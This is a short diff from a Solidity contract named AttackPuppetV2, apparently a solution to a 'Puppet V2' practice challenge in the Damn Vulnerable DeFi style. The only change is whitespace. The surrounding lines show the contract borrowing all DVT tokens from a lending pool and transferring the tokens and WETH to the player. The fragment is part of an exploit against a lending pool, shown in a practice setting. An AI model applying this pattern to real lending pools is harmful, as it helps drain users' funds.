@@ -64,7 +64,7 @@ contract AttackPuppetV2 {
         // Approve the pool to spend our WETH and ask to borrow all DVT
         weth.approve(address(pool), weth.balanceOf(address(this)));
         pool.borrow(BORROW_DVT_AMOUNT);
-
+ 
         // Send all DVT tokens and WETH to the player (EOA account)
         token.transfer(player, token.balanceOf(address(this)));
         weth.transfer(player, weth.balanceOf(address(this)));
